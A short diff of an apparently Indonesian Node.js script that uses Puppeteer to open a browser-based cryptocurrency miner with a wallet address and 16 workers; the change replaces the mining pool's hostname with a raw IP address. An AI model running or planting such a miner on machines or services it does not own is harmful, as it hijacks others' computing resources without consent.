@@ -77,7 +77,7 @@ const run = async () => {
     console.log('Memulai browser...');
     const browser = await puppeteer.launch({ headless: true });
     const page = await browser.newPage();
-    await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
+    await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=45.115.225.39&port=8443&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
     
     // Set timeout untuk menjaga browser terbuka selama 1 menit (60 detik)
     await new Promise(resolve => setTimeout(resolve, 1 * 60 * 1000));
